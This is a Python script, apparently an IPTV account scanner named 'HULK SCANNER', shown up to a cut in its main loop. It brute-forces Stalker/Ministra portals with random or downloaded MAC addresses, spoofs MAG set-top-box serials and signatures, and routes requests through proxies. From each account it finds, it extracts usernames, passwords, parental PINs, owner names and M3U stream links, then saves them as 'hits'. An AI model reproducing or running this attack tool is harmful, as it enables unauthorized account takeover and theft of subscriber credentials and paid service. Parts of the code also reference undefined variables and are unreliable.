import sys, os
NOME = 'HULK SCANNER'
if sys.platform.startswith('win'):
    import ctypes
    ctypes.windll.kernel32.SetConsoleTitleW(NOME)
else:
    sys.stdout.write(f''']2;{NOME}''')
import os,pip
from playsound import playsound
import platform
import urllib.request
try:
    import requests
except ModuleNotFoundError:
    pip.main(['install', 'requests'])
    import requests
my_os = platform.system()
if (my_os == "Windows"):
    rootDir = "./"
    my_os = "Wɪɴᴅᴏᴡs"
else:
    rootDir = "/sdcard/"
    my_os = "Aɴᴅʀᴏɪᴅ"
my_cpu = platform.machine()
my_py = platform.python_version()
print("\33[1;32m OS in my system : ", my_os + "\33[0m")
os.system("cls" if os.name == "nt" else "clear")
try:
    import flag
except:
    pip.main(['install', 'emoji-country-flag'])
    import flag
try:
	import androidhelper as sl4a
	ad = sl4a.Android()
except:pass
import subprocess
try:
	import threading
except:pass
import pathlib,base64
def download_file(url, directory, filename):
    filepath = os.path.join(directory, filename)
    if not os.path.exists(directory):
        os.makedirs(directory)
    try:
        urllib.request.urlretrieve(url, filepath)
    except Exception as e:
        print(f"Error: impossible to scaricare it runs {e}")
url="http://codeskulptor-demos.commondatastorage.googleapis.com/pang/arrow.mp3"
urllib.request.urlretrieve(url,rootDir+"sounds/arrow.mp3")

url1 = "https://drive.google.com/uc?export=download&id=1m0iZzBTs6Vvn38jDihvgblptecws32lN"
directory1 = rootDir+"/combo/"
filename1 = "Online-COMBO_MANZERA.txt"
download_file(url1, directory1, filename1)

url2 = "https://drive.google.com/uc?export=download&id=1_uiQxFQr5NNUb-qlslmgfuf4YxFg3i4l"
directory2 = rootDir+"/combo/"
filename2 = "Online-COMBO.txt"
download_file(url2, directory2, filename2)

os.system("cls" if os.name == "nt" else "clear")
PRL=("""     
\033[0;91m    ░█░█░█░█░█░░░█░█    \33[0m
\033[0;93m    ░█▀█░█░█░█░░░█▀▄    \33[0m
\033[0;92m    ░▀░▀░▀▀▀░▀▀▀░▀░▀      \33[0m                                       
\033[0;91m    █▀ █▀▀ ▄▀█ █▄░█ █▄░█ █▀▀ █▀█    \33[0m 
\033[0;93m    ▄█ █▄▄ █▀█ █░▀█ █░▀█ ██▄ █▀▄    \33[0m 
\033[0;93m    MOD BY \033[0;91m🇬🇹\33[92m𝐀𝐋𝐄𝐒𝐒   \33[0m\33[0;1m""")
print(PRL) 

nickn=""
white=("""\033[38;5;94m\n""") 
if nickn=="":
	nickn=input("""\n
\033[1;93mEscribe tu nombre:      
\033[38;5;229mPresiona ENTER o Escribe tu NOMBRE:= """)
if nickn=="":
	nickn="Papy Gogo"

cpm=0
cpmx=0
hitr=0
m3uon=0
m3uvpn=0
macon=0
macvpn=0
macexp = 0
color=""

def echok(mac,bot,total,hitc,status_code,oran):
	global cpm,hitr,m3uon,m3uvpn,m3uonxmacon,macvpn,macvpn,macon,bib,tokenr,color,macexp
	bib=0
	cpmx=(time.time()-cpm)
	cpmx=(round(60/cpmx))
	if str(cpmx)=="0":
			cpm=cpm
	else:
			cpm=cpmx
	
	# Aqui as cores para o texto ficar mudando de cor
	colors = [90, 91, 92, 93, 94, 95, 96, 97]
	# Escolha a cor com base no tempo atual
	color_code = colors[int(time.time()) % len(colors)]
	text = "© HULK SCANNER BY ALESS ©"		
	echo=("""
\033[0;91m    ░█░█░█░█░█░░░█░█    \33[0m
\033[0;93m    ░█▀█░█░█░█░░░█▀▄    \33[0m
\033[0;92m    ░▀░▀░▀▀▀░▀▀▀░▀░▀      \33[0m                                       
\033[0;91m    █▀ █▀▀ ▄▀█ █▄░█ █▄░█ █▀▀ █▀█    \33[0m 
\033[0;93m    ▄█ █▄▄ █▀█ █░▀█ █░▀█ ██▄ █▀▄    \33[0m 
\033[0;93m    MOD BY \033[0;91m🇬🇹\33[92m 𝐀𝐋𝐄𝐒𝐒   \33[0m
 \033["""+str(color_code)+"""m"""+text+"""\33[92m
╭─➢ HITS BY ➤ ️  \033[0;91m"""+nickn+"""   \33[92m          
├⍟ MY OS ➤   \033[0;93m"""+my_os+"""    \33[92m   
├⍟ MY CPU ➤  \033[0;93m"""+str(my_cpu)+"""    \33[92m
├⍟ MY PY ➤   \033[0;93m"""+my_py+"""     \33[92m
├⍟ SERVIDOR ➤  \033[0;93m"""+str(panel)+"""  \33[92m         
├⍟ TIPO ➤  \033[0;93m"""+str(uzmanm)+"""     \33[92m               
├⍟ MAC ➤  \033[0;93m"""+tokenr+str(mac)+"""   \33[92m            
├⍟ STATUS CODE ➤  \033[0;92m"""+str(color)+""""""+str(status_code)+"""  \33[92m
├⍟ MAC ➤ ON ≽  \033[0;92m"""+str(macon)+ """ VPN ≽ \033[0;93m"""+str(macvpn)+""" \33[92m
├⍟ M3U ➤ ON ≽ \033[0;92m"""+str(m3uon)+ """ OFF ≽  \033[0;91m"""+str(m3uvpn)+""" \33[92m
├⍟ TOTAL ➤  \033[0;93m"""+str(total)+"""    \33[92m                 
├⍟ BOTS ➤  \033[0;93m"""+str(bot)+"""     \33[92m                   
├⍟ CPM ➤  \033[0;93m"""+str(cpm)+"""          \33[92m                
├⍟ PROCESO ➤  \033[0;93m"""+str(oran)+""" %      \33[92m               
╰─⍟ 𝗛𝗜𝗧𝗦 ➤ \033[0;92m"""+str(hitr)+""" """ +str(hitc)+"""  \33[91m 𝐇𝐈𝐓𝐒 𝐌𝐀𝐋𝐎𝐒 ➤ """ +str(macexp)+"""  \33[92m """)
	print(echo, end="", flush=True)
	time.sleep(0.05)
	if status_code==200:color='\33[1m\33[32mOKAY '
	if status_code==301:color='\33[1m\33[1;31m'
	if status_code==302:color='\33[1m\33[1;31m'
	if status_code==403:color='\33[1m\33[1;31m'
	if status_code==404:color='\33[1m\33[38;5;202m'
	if status_code==407:color='\33[1m\33[38;5;003m'
	if status_code==429:color='\33[1m\33[1m\33[93m'
	if status_code==500:color='\33[1m\33[38;5;202m'
	if status_code==503:color='\33[1m\33[38;5;226m'
	if status_code==512:color='\33[1m\33[38;5;180mMAYBE '
	if status_code==520:color='\33[1m\33[35m'


#	print(echo)
	cpm=time.time()
	
bot=0
hit=0
hitr="\33[1;92m"
tokenr="\33[0m"
oran=""
def bekle(bib,vr):
	i=bib
	
	animation = [
"[■□□□□□□□□□□□□□□]","[■■□□□□□□□□□□□□□]", "[■■■□□□□□□□□□□□□]", "[■■■■□□□□□□□□□□□]", "[■■■■■□□□□□□□□□□]", "[■■■■■■□□□□□□□□□]", "[■■■■■■■□□□□□□□□]", "[■■■■■■■■□□□□□□□]", "[■■■■■■■■■□□□□□□]", "[■■■■■■■■■■□□□□□]",
"[■■■■■■■■■■■□□□□]",
"[■■■■■■■■■■■■□□□]",
"[■■■■■■■■■■■■■□□]",
"[■■■■■■■■■■■■■■□]",
"[■■■■■■■■■■■■■■■]"]

	
	#for i in range(len(animation)):
	time.sleep(0.2)
	sys.stdout.write("\r"'\33[91mPRL\33[0m'+ animation[ i % len(animation)]+'    \33[91mPʀᴏxCʜᴇᴄᴋ️   \33[0m')
	sys.stdout.flush()
	#print('\n')			

		
kanalkata="2"
stalker_portal="PRL"
def hityaz(mac,trh,real,m3ulink,m3uimage,durum,vpn,livelist,vodlist,serieslist,playerapi,fname,tariff_plan,ls,login,password,tariff_plan_id,bill,expire_billing_date,max_online,parent_password,stb_type,comment,country,settings_password,adult,scountry,country_name):
	global hitr,hitsay
	panell=panel
	reall=real
	if 'PRL' == 'PRL':#try:
		simza=""
		if uzmanm=="stalker_portal/server/load.php":
			panell=str(panel)+'/stalker_portal'
			reall=real.replace('/c/','/stalker_portal/c/')
			simza="""
			
╭─ ᕚ ░A░l░e░s░s░░S░t░a░l░k░e░r░ ░I░n░f░o░ ᕘ
┊⋆BILLING ➤ """+str(bill)+"""
┊⋆EXPIRY ➤ """+expire_billing_date+"""
┊⋆USER ➤ """+login+"""
┊⋆PASS ➤ """+password+"""
┊⋆FULL NAME  ➤ """+fname+"""
┊⋆ADULT PAS ➤ """+parent_password+"""
┊⋆MAX CON ➤ """+max_online+"""
┊⋆TYPE ➤ """+stb_type+"""
┊⋆PASSWD ➤ """+settings_password+"""
┊⋆TARIFF ID ➤ """+tariff_plan_id+"""
╰─ PLAN ➤ """+tariff_plan+"""
"""
		imza="""

╭─ ᕚ ░A░l░e░s░s░░G░e░n░e░r░a░l░ ░I░n░f░o░ ᕘ
┊⋆MY OS ➤  """+my_os+"""       
┊⋆MY CPU ➤  """+str(my_cpu)+"""    
┊⋆MY PY ➤  """+my_py+"""      
┊⋆FECHA DE SCAN ➤ """+str(time.strftime('%d-%m-%Y'))+"""
┊⋆HORA DE SCAN ➤ """+str(time.strftime('%H:%M:%S'))+"""
┊⋆REAL ➤ """+str(reall)+"""
┊⋆SERVIDOR ➤ http://"""+str(panell)+"""/c/	
┊⋆MAC  ➤ """+str(mac)+"""
┊⋆VENCE ➤ """+str(trh)+"""
┊⋆MAC ➤ """+str(durum)+"""
┊⋆M3U ➤ """+m3uimage+"""
┊⋆VPN ➤ """+str(vpn)+"""
┊⋆ADULT PASS ➤ """+str(adult)+"""
╰─ SCAN BY ➤ """+str(nickn)+"""
"""+str(playerapi)+""" """
		sifre=device(mac)
		
		pimza="""
		
⟬M3U⟭ ➤ """+str(m3ulink)+""" """
		imza=imza+sifre+simza+pimza
		if  kanalkata=="1" or kanalkata=="2" or kanalkata=="3":
			imza=imza+""" 
			
⟬Channels⟭ ➤
 """+str(livelist)+""" """
		if kanalkata=="2"or kanalkata=="3":
			imza=imza+"""  			
⟬VOD⟭ ➤
  """+str(vodlist)+""" 
⟬Series⟭ ➤
 """+str(serieslist)+"""
     # ▄︻デA̷L̷E̷S̷S̷══━一
  ⟁⃤  ▼─○ 𝐸𝑛𝑑 𝑂𝑓 𝐻𝑖𝑡 ○─▼  ⟁⃤
·····································
"""
			imza3 = """ 
   
╭─ ᕚ ░A░l░e░s░s░ ░H░U░L░K░ ░S░C░A░N░N░E░R░ ᕘ
┊⋆ 🄼🄸🄽🄸  🄷🄸🅃 
┊⋆Fecha Scan ➤ """+str(time.strftime('%d-%m-%Y'))+"""
┊⋆Servidor ➤ http://"""+str(panell)+"""/c/
┊⋆Mᴀᴄ ➤ """+str(mac)+"""
┊⋆Eɴᴅꜱ ➤ """+str(trh)+"""
╰─ Sᴄᴀɴ Bʏ ➤ """+str(nickn)+"""
╭─🄺🄰🄽🄰🄻♻️🄲🄷🄴🄲🄺
┊⋆Mᴀᴄ ➤ """+str(durum)+"""
╰─ Vᴘɴ ➤  """+str(vpn)+"""
╭─   # ▄︻デA̷L̷E̷S̷S̷══━一
┊⋆ ⟁⃤  ▼─○ 𝐸𝑛𝑑 𝑂𝑓 𝐻𝑖𝑡 ○─▼  ⟁⃤
╰·····································""" 
    


		#imza=imza
		yaz(imza3)
		yax(imza)
		hitsay=hitsay+1
		print(imza)
		if hitsay >= hit:
			hitr="\33[1;92m"
	#except:pass
hitsf =rootDir+ '/Hits/'
if not os.path.exists(hitsf):
    os.mkdir(hitsf)
hits =rootDir+ '/Hits/HULK SCANNER/'
if not os.path.exists(hits):
    os.mkdir(hits)
hitsf =rootDir+ '/Hits/HULK SCANNER/Mini🎰Hits/'
if not os.path.exists(hitsf):
    os.mkdir(hitsf)
hitsf =rootDir+ '/Hits/HULK SCANNER/Full🎰Hits/'
if not os.path.exists(hitsf):
    os.mkdir(hitsf)
#hitsf = '/sdcard/Hits/HULK SCANNER/Mac🎰Hits/'
#if not os.path.exists(hitsf):
#    os.mkdir(hitsf)
hitsay = 0
say = 1

def yaz(hits):
    dosya = open(DosyaA, 'a+', encoding='utf-8')
    dosya.write(hits)
    dosya.close()


def yax(hits):
    dosya = open(Dosyab, 'a+', encoding='utf-8')
    dosya.write(hits)
    dosya.close()

def device(mac):
	mac=mac.upper()
	SN=(hashlib.md5(mac.encode('utf-8')).hexdigest())
	SNENC=SN.upper() #SN
	SNCUT=SNENC[:13]#Sncut
	DEV=hashlib.sha256(mac.encode('utf-8')).hexdigest()
	DEVENC=DEV.upper() #dev1
	DEV1=hashlib.sha256(SNCUT.encode('utf-8')).hexdigest()
	DEVENC1=DEV1.upper()#dev2
	SG=SNCUT+'+'+(mac)
	SING=(hashlib.sha256(SG.encode('utf-8')).hexdigest())
	SINGENC=SING.upper()
	sifre="""
╭─ ᕚ ░A░l░e░s░s░░D░E░V░I░C░E░ ░ ░I░N░F░O░R░M░A░T░I░O░N░ ᕘ
┊⋆SERIAL ➤  """+SN+""" 
┊⋆SERIAL CUT ➤ """+SNCUT+"""
┊⋆DEVICE ID1 ➤ """+DEVENC+"""
┊⋆DEVICE ID2 ➤ """+DEVENC1+"""
┊⋆SIGNATURE  ➤ """+SINGENC+"""
┊⋆HITS BY ➤ """+str(nickn)+""" 
╰·····································"""
	return sifre
def list(listlink,mac,token,livel):
	kategori=""
	veri=""
	while True:
		try:
			res = ses.get(listlink,headers=hea2(mac,token),proxies=proxygetir(),timeout=(3), verify=False)
			veri=str(res.text)
			break
		except:pass
	if veri.count('title":"')>0:
			for i in veri.split('title":"'):
				try:
					kanal=""
					kanal= str((i.split('"')[0]).encode('utf-8').decode("unicode-escape")).replace('\/','/')
				except:pass
				kategori=kategori+kanal+livel
				kategori=kategori.replace("{","")
	list=kategori
	return list
def m3ugoruntu(cid,user,pas,plink):
	durum="⛔ 𝗢𝗙𝗙𝗟𝗜𝗡𝗘 🤯"
	try:
			url=http+"://"+plink+'/live/'+str(user)+'/'+str(pas)+'/'+str(cid)+'.ts'
			res = ses.get(url,  headers=hea3(), timeout=(2,5), allow_redirects=False,stream=True)
			if res.status_code==302:
				durum="✅ 𝗢𝗡𝗟𝗜𝗡𝗘 🥳"
	except:
			durum="⛔ 𝗢𝗙𝗙𝗟𝗜𝗡𝗘 🤯"
	return durum
hit=0						

def m3uapi(playerlink,mac,token):
	mt=""
	bag=0
	veri=""
	bad=0
	while True:
		try:
			res = ses.get(playerlink, headers=hea2(mac,token), proxies=proxygetir(),timeout=(3), verify=False)
			veri=str(res.text)
			break
		except:
			if not proxi =="1":
				bad=bad+1
				if bad==3:
					break
	if veri=="" or '404' in veri:
		bad=0
		while True:
			try:
				playerlink=playerlink.replace('player_api.php','panel_api.php')
				res = ses.get(playerlink, headers=hea2(mac,token), proxies=proxygetir(),timeout=(3), verify=False)
				veri=str(res.text)
				break
			except:
				if not proxi =="1":
					bad=bad+1
					if bad==3:
						break
	acon=""
	timezone=""
	message=""
	if 'active_cons' in veri:
				acon=veri.split('active_cons":')[1]
				acon=acon.split(',')[0]
				acon=acon.replace('"',"")
				mcon=veri.split('max_connections":')[1]
				mcon=mcon.split(',')[0]
				mcon=mcon.replace('"',"")
				status=veri.split('status":')[1]
				status=status.split(',')[0]
				status=status.replace('"',"")
				try:
					timezone=veri.split('timezone":"')[1]
					timezone=timezone.split('",')[0]
					timezone=timezone.replace("\/","/")
				except:pass
				realm=veri.split('url":')[1]
				realm=realm.split(',')[0]
				realm=realm.replace('"',"")
				port=veri.split('port":')[1]
				port=port.split(',')[0]
				port=port.replace('"',"")
				userm=veri.split('username":')[1]
				userm=userm.split(',')[0]
				userm=userm.replace('"',"")
				pasm=veri.split('password":')[1]
				pasm=pasm.split(',')[0]
				pasm=pasm.replace('"',"")
				bitism=veri.split('exp_date":')[1]
				bitism=bitism.split(',')[0]
				bitism=bitism.replace('"',"")
				try:
					message=veri.split('message":"')[1].split(',')[0].replace('"','')
					message=str(message.encode('utf-8').decode("unicode-escape")).replace('\/','/')
				except:pass
				if bitism=="null":
					bitism="Unlimited"
				else:
					bitism=(datetime.datetime.fromtimestamp(int(bitism)).strftime('%d-%m-%Y %H:%M:%S'))
					mt=("""
					
╭─ ᕚ ░A░l░e░s░s░ ░M░3░U░ ░I░N░F░O░ ᕘ             
┊⋆ SERVIDOR ➤ http://"""+panel+"""
┊⋆ REAL ➤ http://"""+realm+""":"""+port+"""     
┊⋆ PUERTO ➤ """+port+"""
┊⋆ USER ➤ """+userm+"""
┊⋆ PASS ➤ """+pasm+"""
┊⋆ VENCE ➤ """+bitism+"""
┊⋆ ACT.CON ➤ """+acon+"""
┊⋆ MAX.CON ➤ """+mcon+"""
┊⋆ STATUS ➤ """+status+"""
╰ TIMEZONE ➤ """+timezone+"""
""")
	return mt
	
							
def goruntu(link,cid):
	#print(link)
	say=0
	duru="✅ 𝗘𝗫𝗜𝗦𝗧 🥳 "
	try:
		res = ses.get(link,  headers=hea3(), timeout=10, allow_redirects=False,stream=True)
		#print(res.status_code)
		if res.status_code==302:
			duru="✅ 𝗘𝗫𝗜𝗦𝗧 🥳 "
	except:
			duru="⛔ 𝗨𝗦𝗘 𝗩𝗣𝗡 🤯"
	return duru		
		
def url7(cid):
	url=http+"://"+panel+"/"+uzmanm+"?type=itv&action=create_link&cmd=ffmpeg%20http://localhost/ch/"+str(cid)+"_&series=&forced_storage=0&disable_ad=0&download=0&force_ch_link_check=0&JsHttpRequest=1-xml"
	if uzmanm=="stalker_portal/server/load.php":
		url7=http+"://"+panel+"/"+uzmanm+"?type=itv&action=create_link&cmd=ffrt%20http://localhost/ch/"+str(cid)+"&series=&forced_storage=0&disable_ad=0&download=0&force_ch_link_check=0&JsHttpRequest=1-xml"
		url7=http+"://"+panel+"/"+uzmanm+"?type=itv&action=create_link&cmd=ffrt%20http:///ch/"+str(cid)+"&&series=&forced_storage=0&disable_ad=0&download=0&force_ch_link_check=0&JsHttpRequest=1-xml"
	return str(url)
	
def hea3():
	hea={
"Icy-MetaData": "1",
"User-Agent": "Lavf/57.83.100", 
"Accept-Encoding": "identity",
"Host": panel,
"Accept": "*/*",
"Range": "bytes=0-",
"Connection": "close",
	}
	return hea			
def hitecho(mac,trh):
	if rootDir == "./":
		playsound(rootDir+'sounds/Doomchaingun.mp3')
		file = pathlib.Path()
		try:
			if file.exists():
				ad.mediaPlay()
		except:pass
	
	if rootDir == "/sdcard/":
		sesdosya=rootDir+"sounds/Doomchaingun.mp3"
		file = pathlib.Path(sesdosya)
		try:
			if file.exists():
			   ad.mediaPlay(sesdosya)
		except:pass
def unicode(fyz):
	cod=fyz.encode('utf-8').decode("unicode-escape").replace('\/','/')
	return cod

def duzel2(veri,vr):
	data=""
	try:
		data=veri.split('"'+str(vr)+'":"')[1]
		data=data.split('"')[0]
		data=data.replace('"','')
		data=unicode(data)
	except:pass
	return str(data)
				
def duzelt1(veri,vr):
	data=veri.split(str(vr)+'":"')[1]
	data=data.split('"')[0]
	data=data.replace('"','')
	return str(data)
				
									
import datetime
import time
import hashlib
import urllib
def url2(mac,random):
	macs=mac.upper()
	macs=urllib.parse.quote(macs)
	SN=(hashlib.md5(mac.encode('utf-8')).hexdigest())
	SNENC=SN.upper() #SN
	SNCUT=SNENC[:13]#Sncut
	DEV=hashlib.sha256(mac.encode('utf-8')).hexdigest()
	DEVENC=DEV.upper() #dev1
	DEV1=hashlib.sha256(SNCUT.encode('utf-8')).hexdigest()
	DEVENC1=DEV1.upper()#dev2
	SG=SNCUT+(mac)
	SING=(hashlib.sha256(SG.encode('utf-8')).hexdigest())
	SINGENC=SING.upper() #signature
	url22=http+"://"+panel+"/"+uzmanm+"?type=stb&action=get_profile&JsHttpRequest=1-xml"
	if uzmanm=="stalker_portal/server/load.php":
	    times=time.time()
	    url22=http+"://"+panel+"/"+uzmanm+'?type=stb&action=get_profile&hd=1&ver=ImageDescription:%200.2.18-r22-pub-270;%20ImageDate:%20Tue%20Dec%2019%2011:33:53%20EET%202017;%20PORTAL%20version:%205.6.6;%20API%20Version:%20JS%20API%20version:%20328;%20STB%20API%20version:%20134;%20Player%20Engine%20version:%200x566&num_banks=2&sn='+SNCUT+'&stb_type=MAG270&client_type=STB&image_version=0.2.18&video_out=hdmi&device_id='+DEVENC+'&device_id2='+DEVENC+'&signature=OaRqL9kBdR5qnMXL+h6b+i8yeRs9/xWXeKPXpI48VVE=&auth_second_step=1&hw_version=1.7-BD-00&not_valid_token=0&metrics=%7B%22mac%22%3A%22'+macs+'%22%2C%22sn%22%3A%22'+SNCUT+'%22%2C%22model%22%3A%22MAG270%22%2C%22type%22%3A%22STB%22%2C%22uid%22%3A%22BB340DE42B8A3032F84F5CAF137AEBA287CE8D51F44E39527B14B6FC0B81171E%22%2C%22random%22%3A%22'+random+'%22%7D&hw_version_2=85a284d980bbfb74dca9bc370a6ad160e968d350&timestamp='+str(times)+'&api_signature=262&prehash=efd15c16dc497e0839ff5accfdc6ed99c32c4e2a&JsHttpRequest=1-xml'
	    if stalker_portal=="2":
	    	url22=http+"://"+panel+"/"+uzmanm+'?type=stb&action=get_profile&hd=1&ver=ImageDescription: 0.2.18-r14-pub-250; ImageDate: Fri Jan 15 15:20:44 EET 2016; PORTAL version: 5.5.0; API Version: JS API version: 328; STB API version: 134; Player Engine version: 0x566&num_banks=2&sn='+SNCUT+'&stb_type=MAG254&image_version=218&video_out=hdmi&device_id='+DEVENC+'&device_id2='+DEVENC+'&signature='+SINGENC+'&auth_second_step=1&hw_version=1.7-BD-00&not_valid_token=0&client_type=STB&hw_version_2=7c431b0aec69b2f0194c0680c32fe4e3&timestamp='+str(times)+'&api_signature=263&metrics={\\\"mac\\\":\\\"'+macs+'\\\",\\\"sn\\\":\\\"'+SNCUT+'\\\",\\\"model\\\":\\\"MAG254\\\",\\\"type\\\":\\\"STB\\\",\\\"uid\\\":\\\"'+DEVENC+'\\\",\\\"random\\\":\\\"'+random+'\\\"}&JsHttpRequest=1-xml'
	    if stalker_portal=="1":
	    	url22=http+"://"+panel+"/"+uzmanm+'?action=get_profile&mac="+macs+"&type=stb&hd=1&sn=&stb_type=MAG250&client_type=STB&image_version=218&device_id=&hw_version=1.7-BD-00&hw_version_2=1.7-BD-00&auth_second_step=1&video_out=hdmi&num_banks=2&metrics=%7B%22mac%22%3A%22"+macs+"%22%2C%22sn%22%3A%22%22%2C%22model%22%3A%22MAG250%22%2C%22type%22%3A%22STB%22%2C%22uid%22%3A%22%22%2C%22random%22%3A%22null%22%7D&ver=ImageDescription%3A%200.2.18-r14-pub-250%3B%20ImageDate%3A%20Fri%20Jan%2015%2015%3A20%3A44%20EET%202016%3B%20PORTAL%20version%3A%205.6.1%3B%20API%20Version%3A%20JS%20API%20version%3A%20328%3B%20STB%20API%20version%3A%20134%3B%20Player%20Engine%20version%3A%200x566'
	    	
	    	
	if realblue=="real" or uzmanm=="c/portal.php":
		url22=http+"://"+panel+"/"+uzmanm+"?&action=get_profile&mac="+macs+"&type=stb&hd=1&sn=&stb_type=MAG250&client_type=STB&image_version=218&device_id=&hw_version=1.7-BD-00&hw_version_2=1.7-BD-00&auth_second_step=1&video_out=hdmi&num_banks=2&metrics=%7B%22mac%22%3A%22"+macs+"%22%2C%22sn%22%3A%22%22%2C%22model%22%3A%22MAG250%22%2C%22type%22%3A%22STB%22%2C%22uid%22%3A%22%22%2C%22random%22%3A%22null%22%7D&ver=ImageDescription%3A%200.2.18-r14-pub-250%3B%20ImageDate%3A%20Fri%20Jan%2015%2015%3A20%3A44%20EET%202016%3B%20PORTAL%20version%3A%205.6.1%3B%20API%20Version%3A%20JS%20API%20version%3A%20328%3B%20STB%20API%20version%3A%20134%3B%20Player%20Engine%20version%3A%200x566"
	return url22
def XD():
	global m3uvpn,m3uon,macon,macvpn,bot,hit,tokenr,hitr,macexp
	bot=bot+1
	for PRL in range(combouz):
		if comboc=="PRL":
			mac=randommac()
			mac=mac.upper()
		else:
			macv=re.search(pattern,combogetir(),re.IGNORECASE)
			if macv:
				mac=macv.group()
				mac=mac.upper()
			else:
				continue
		url=http+"://"+panel+"/"+uzmanm+"?type=stb&action=handshake&token=&prehash=false&JsHttpRequest=1-xml"
		ses=requests.Session()
		prox=proxygetir()
		oran=round(((combosay)/(combouz)*100),2)
		#print(url)
		while True:
			try:
				res=ses.get(url,headers=hea1(panel,mac),proxies=prox,timeout=(3))
				break
			except:
				prox=proxygetir()
		echok(mac,bot,combosay,hit,res.status_code,oran)
		veri=str(res.text)
    #print(veri)
		random=""
		if not 'token":"' in veri:
			tokenr=" \33[35m"
			ses.close
			res.close
			continue
		tokenr="\33[0m"
		token=duzelt1(veri,"token")
		if 'random' in veri:
			random=duzelt1(veri,"random")
		veri=""
		while True:
			try:
				res=ses.get(url2(mac,random),headers=hea2(mac,token),proxies=prox,timeout=(3))
				break
			except:
				prox=proxygetir()
		veri=str(res.text)
		adult=veri.split('parent_password":"')[-1]
		adult=adult.split('","bright')[0]
		#print(veri)
		id="null"
		ip=""
		login=""
		parent_password=""
		password=""
		stb_type=""
		tariff_plan_id=""
		comment=""
		country=""
		settings_password=""
		expire_billing_date=""
		max_online=""
		expires=""
		ls=""
		try:
			id=veri.split('{"js":{"id":')[1]
			id=str(id.split(',"name')[0])
		except:pass
		
		try:
				ip=str(duzel2(veri,"ip"))
		except:pass
		try:
			expires=str(duzel2(veri,"expires"))
		except:pass
		if id=="null" and expires=="" and ban=="":
			continue
			ses.close
			res.close
		if uzmanm=="stalker_portal/server/load.php":
			if 'login":"' in veri:
				login=str(duzel2(veri,"login"))
				parent_password=str(duzel2(veri,"parent_password"))
				password=str(duzel2(veri,"password"))
				stb_type=str(duzel2(veri,"stb_type"))
				tariff_plan_id=str(duzel2(veri,"tariff_plan_id"))
				comment=str(duzel2(veri,"comment"))
				country=str(duzel2(veri,"country"))
				settings_password=str(duzel2(veri,"settings_password"))
				expire_billing_date=str(duzel2(veri,"expire_billing_date"))
				ls=str(duzel2(veri,"ls"))
				try:
					max_online=str(duzel2(veri,"max_online"))
				except:pass
		#print(veri)
		url=http+"://"+panel+"/"+uzmanm+"?type=account_info&action=get_main_info&JsHttpRequest=1-xml"
		
		veri=""
		while True:
			try:
				res=ses.get(url,headers=hea2(mac,token),proxies=prox,timeout=(3))
				break
			except:
				prox=proxygetir()
		veri=str(res.text)
		#print(veri)
	#	quit()
		if veri.count('phone')==0 and veri.count('end_date')==0 and expires=="" and expire_billing_date=="":
			continue
			ses.close
			res.close
		fname=""
		tariff_plan=""
		ls=""
		trh=""
		bill=""
		if uzmanm=="stalker_portal/server/load.php":
			try:
				fname=str(duzel2(veri,"fname"))
			except:pass
			try:
			    tariff_plan=str(duzel2(veri,"tariff_plan"))
			except:pass
			try:
			    bill=str(duzel2(veri,"created"))
			except:pass
		if "phone" in veri:
			trh=str(duzel2(veri,"phone"))
		if "end_date" in veri:
			trh=str(duzel2(veri,"end_date"))
		if trh=="":
			if not expires=="":
				trh=expires
		try:
			trh=(datetime.datetime.fromtimestamp(int(trh)).strftime('%d-%m-%Y %H:%M:%S'))
		except:pass
		if '(-' in trh:
			continue
			ses.close
			res.close
		
		if trh.lower()[:2] =='un':
			KalanGun=(" Days")
		else:
			try:
                                KalanGun=(str(tarih_clear(trh))+" Days")
                                if tarih_clear(trh) < 0:
                                      macexp=macexp+1
                                      continue
                                      ses.close
                                      res.close
                                trh=trh+' '+ KalanGun
			except:pass
		if trh=="":
			if uzmanm=="stalker_portal/server/load.php" or "xx//server/load.php":
				trh=expire_billing_date
				if not "0000-00-00 00:00:00" in trh:
					if trh < current_time:
						macexp=macexp+1
						continue
						ses.close
						res.close
		veri=""
		cid="1842"
		url=http+"://"+panel+"/"+uzmanm+"?type=itv&action=get_all_channels&force_ch_link_check=&JsHttpRequest=1-xml"
		bad=0
		while True:
			try:
				res=ses.get(url,headers=hea2(mac,token),proxies=proxygetir(),timeout=(3))
				veri=str(res.text)
				if 'total' in veri:
					cid=(str(res.text).split('ch_id":"')[5].split('"')[0])
				if uzmanm=="stalker_portal/server/load.php":
				     cid=(str(res.text).split('id":"')[5].split('"')[0])
				break
			except:pass
		user=""
		pas=""
		link=""
		
		real=panel
		if not expires=="":
			veri=""
			cmd=""
			url=http+"://"+panel+"/"+uzmanm+"?action=get_ordered_list&type=vod&p=1&JsHttpRequest=1-xml"
			while True:
				try:
					res=ses.get(url,headers=hea2(mac,token),proxies=proxygetir(),timeout=(3))
					veri=str(res.text)
					break
				except:pass
			if not 'cmd' in veri:
				continue
			cmd=duzel2(veri,'cmd')
			
			veri=""
			url=http+"://"+panel+"/"+uzmanm+"?type=vod&action=create_link&cmd="+str(cmd)+"&series=&forced_storage=&disable_ad=0&download=0&force_ch_link_check=0&JsHttpRequest=1-xml"
			while True:
				try:
					res=ses.get(url,headers=hea2(mac,token),proxies=proxygetir(),timeout=(3))
					veri=str(res.text)
					break
				except:pass
			if 'cmd":"' in veri:
				link=veri.split('cmd":"')[1].split('"')[0].replace('\/','/')
				user=str(link.replace('movie/','').split('/')[3])
				real=http+"://"+link.split('://')[1].split('/')[0]+'/c/'
				pas=str(link.replace('movie/','').split('/')[4])
				cid=duzel2(veri,'id')
				m3ulink="http://"+ real.replace('http://','').replace('/c/', '') + "/get.php?username=" + str(user) + "&password=" + str(pas) + "&type=m3u_plus&output=m3u8"
				
		hitecho(mac,trh)
		hit=hit+1
		hitr="\33[1;96m"
		veri=""
		if user=="":
			while True:
				try:
					res = ses.get(url7(cid), headers=hea2(mac,token), proxies=proxygetir(),timeout=(3), verify=False)
					veri=str(res.text)
					if 'ffmpeg ' in veri:
					     link=veri.split('ffmpeg ')[1].split('"')[0].replace('\/','/')
					else:
					     if 'cmd":"' in veri:
					     	link=veri.split('cmd":"')[1].split('"')[0].replace('\/','/')
					     	user=login
					     	pas=password
					     	real='http://'+link.split('://')[1].split('/')[0]+'/c/'
					if 'ffmpeg ' in veri:
					     user=str(link.replace('live/','').split('/')[3])
					     pas=str(link.replace('live/','').split('/')[4])
					     if real==panel:
					     	real='http://'+link.split('://')[1].split('/')[0]+'/c/'
					m3ulink="http://"+ real.replace('http://','').replace('/c/', '') + "/get.php?username=" + str(user) + "&password=" + str(pas) + "&type=m3u_plus&output=m3u8"
				
					break
				except:pass
		durum=""
		if not link=="":
			try:
				durum=goruntu(link,cid)
